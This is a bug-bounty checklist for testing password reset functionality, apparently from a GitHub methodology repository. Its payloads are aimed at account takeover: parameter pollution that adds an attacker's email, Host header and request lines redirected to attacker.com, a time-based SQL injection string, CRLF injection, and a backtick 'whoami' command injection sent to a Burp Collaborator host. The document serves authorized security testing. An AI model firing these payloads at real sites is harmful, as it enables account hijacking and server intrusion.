# Testing Password Reset Functionality
1. Look for Password Reset Poisoning. (Change the X-Forwarded-host, Referer, Host header to our domain)
2. HTTP Parameter Pollution:
```
email=victim@gmail.com&email=attacker@gmail.com
email[]=victim@gmail.com&email[]=attacker@gmail.com
email=victim@gmail.com%20email=attacker@gmail.com
email=victim@gmail.com|email=attacker@gmail.com
{"email":"victim@gmail.com","email":"attacker@gmail.com"}
{"email":["victim@gmail.com","attacker@gmail.com"]}
```
Check if you can reset victim's password using the link received in attacker's inbox.

3. Look for IDOR while resetting password through password reset link. Use paramminer to discover additional parameters or append previously known parameters (For example, you may find a parameter uid while updating your profile) in the request. 
https://medium.com/@deadoverflow/account-takeover-vulnerability-that-resulted-in-2500-bounty-e1618363878d
4. Broken Crypto - Check if you can guess how the password reset tokens are generated.
5. Password reset token Leakage via referral header - Open the password reset link and click on any external links available in the page. 
6. Token leakage in response/JS files - Search for the password reset token in the response of the request or in JS files.
7. Session/Token is not expiring after password reset.
8. Weak Password Policy - Add only space in password.
9. Request for 2 password reset links and try the older one.
(RTLO)[https://hackerone.com/reports/563268]
(BYPASS)[https://hackerone.com/reports/271324]
10. Try:
```
POST https://attacker.com/resetpassword.php HTTP/1.1
POST @attacker.com/resetpassword.php HTTP/1.1
POST :@attacker.com/resetpassword.php HTTP/1.1
POST /resetpassword.php@attacker.com HTTP/1.1
```
Check if the password reset link is manipulated or not.

11. SQLi: ```test@test.com'+(select*from(select(sleep(2)))a)+'```
12. CRLF: ```/resetpassword?%0d%0aHost:%20attacker.com```
13. Register with a username identical to the victim's username, but with white spaces inserted before and/or after the username("tuhin1729 ", " tuhin1729 " etc). Try a password reset for your account. Use the token to reset victim's password. A similar vulnerability was found in CTFd ([CVE-2020-7245](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7245))
14. Application Level DoS - Try to set a very long password and check if the response time is delayed or if you get a 5xx response.
15. If they are sending an otp for password reset, try [2FA Bypass](https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/2FA.md) techniques.
16. During registration, use graph in email. Now try password reset.
17. Change the request method and content-type and observer how the application is responding.
18. Append null bytes after your email and observe the response.
19. Try XSS, SSTI etc in the email field.
20. Try Command injection by ```email=hello@`whoami`.xyz.burpcollaborator.net```
21. 2FA auto disabled after password reset.
22. User Enumeration.
23. Check whether any param value is reflecting in the email. Now try HTMLi.
24. XXE (if forgot-password request accepts xml).
25. Missing Rate Limit - Email triggering.
26. If a link with token is sent to the email, try using an old token in a checkout page for example: https://www.youtube.com/watch?v=4w9891MjY4I
27. Password reset token does not expire: Request a password reset link, change the account's email, Check if the password reset link still works
28. Email Verification Bypass
29. Is there a way to (login without password)?[https://zseano.medium.com/how-re-signing-up-for-an-account-lead-to-account-takeover-3a63a628fd9f]


Reference:
- https://twitter.com/tuhin1729_/status/1437471718142976007
- https://speakerdeck.com/tuhin1729/account-takeover-via-exploiting-misconfigured-password-reset-feature
- https://speakerdeck.com/tuhin1729/abusing-password-reset-functionality

https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
